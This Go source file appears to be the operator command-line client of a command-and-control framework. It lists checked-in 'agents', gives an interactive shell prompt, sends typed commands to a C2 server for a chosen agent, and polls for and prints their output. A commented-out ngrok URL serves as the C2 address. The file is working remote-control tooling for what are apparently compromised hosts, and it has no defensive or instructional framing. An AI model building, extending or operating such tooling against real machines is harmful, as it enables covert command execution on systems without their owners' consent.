package cli

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"time"
)

var timeoutSetting = 1

//var c2 = "https://e49a4a48f45d.ngrok.io"
//var agent = "test"

//ok
type Cmd struct {
	ID      string
	Command string
	Agent   string
	Status  string
	Cmdid   string
	Output  string
}

type Agent struct {
	ID      string
	Agent   string
	Working string
	checkIn time.Time
}

func ListAgents(c2 string) {
	getAgents(c2 + "/api/agents/")
}

func getAgents(url string) {

	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		log.Fatal(readErr)
	}

	var results []Agent
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		log.Fatal(jsonErr)
	}

	for _, d := range results {
		fmt.Fprintln(os.Stderr, "Active callback: "+d.Agent)
	}
}

func Start(agent string, c2 string) {
	reader := bufio.NewReader(os.Stdin)
	timeout := time.Duration(timeoutSetting) * time.Second
	ticker := time.NewTicker(timeout)
	quit := make(chan struct{})
	for {
		wd := getAgentWorking(c2 + "/api/agent/" + agent)
		fmt.Print(wd + "-" + agent + "$ ")
		select {
		case <-ticker.C:
			cmdString, err := reader.ReadString('\n')
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
			}
			err = sendCommand(cmdString, agent, c2)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
			}
			deadline := time.Now().Add(15 * time.Second)
			for {
				data := getJSON(c2+"/api/cmd/output/"+agent, c2)
				if data == "True" || cmdString == "\n" {
					break
				}
				if time.Now().After(deadline) {
					fmt.Fprintln(os.Stderr, "*Wait*")
					break
				}
			}
		case <-quit:
			return
		}
	}
}

func sendCommand(cmd string, agent string, c2 string) error {
	resp, err := http.PostForm(c2+"/api/cmd/new",
		url.Values{"cmd": {cmd}, "agent": {agent}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
	return nil
}

func getJSON(url string, c2 string) string {

	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		log.Fatal(readErr)
	}

	var results []Cmd
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		log.Fatal(jsonErr)
	}

	for _, d := range results {
		if len(d.Output) > 0 {
			//fmt.Println(d.Output)
			fmt.Fprintln(os.Stderr, d.Output)
			updateCmdStatus(d.Cmdid, c2)
			return "True"
		}
		//fmt.Println(d.Cmdid + ": " + d.Output)
		//updateCmdStatus(d.Cmdid)
	}

	// Print the HTTP response status.
	//fmt.Println("Response status:", resp.Status)
	return "False"
}

func getAgentWorking(url string) string {

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		log.Fatal(readErr)
	}

	var results Agent
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		log.Fatal(jsonErr)
	}

	//fmt.Println(results.Working)

	return results.Working

}

func updateCmdStatus(cmdid string, c2 string) {
	resp, err := http.PostForm(c2+"/api/cmd/update/output",
		url.Values{"id": {cmdid}, "client_status": {"1"}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}
